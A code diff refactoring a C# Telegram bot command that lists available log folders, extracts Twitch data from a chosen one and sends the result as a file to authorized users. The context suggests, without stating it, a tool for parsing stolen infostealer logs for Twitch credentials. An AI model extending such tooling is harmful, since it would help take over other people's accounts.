@@ -9,7 +9,13 @@ namespace TelegramBot.Commands.Services;
 
 public class TwitchServiceCommand(Client client, DataService data) : ICommand, ICallbackCommand
 {
-    public async Task Invoke(UpdateBotCallbackQuery update, User user)
+    public bool AuthorizedOnly { get; } = true;
+
+    Task ICommand.Invoke(UpdateNewMessage update, User user) =>
+        client.SendMessageAvailableLogs(user, "Twitch", data);
+    
+    // ◀️▶️
+    async Task ICallbackCommand.Invoke(UpdateBotCallbackQuery update, User user)
     {
         if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not
             { } logsname) return;
@@ -19,16 +25,10 @@ public class TwitchServiceCommand(Client client, DataService data) : ICommand, I
         await client.EditMessage(user, update.msg_id, $"Telegram\nParsing from {logsname}");
 
         string filepath = await data.SaveAsync(
-            new DirectoryInfo(logsname).Name,
+            logsname,
             logs.TwitchFromLogs(),
             "Twitch");
 
         await data.SendFileAsync(user, filepath);
     }
-
-    public bool AuthorizedOnly { get; } = true;
-
-    // ◀️▶️
-    public Task Invoke(UpdateNewMessage update, User user) =>
-        client.SendMessageAvailableLogs(user, data, "Twitch");
 }
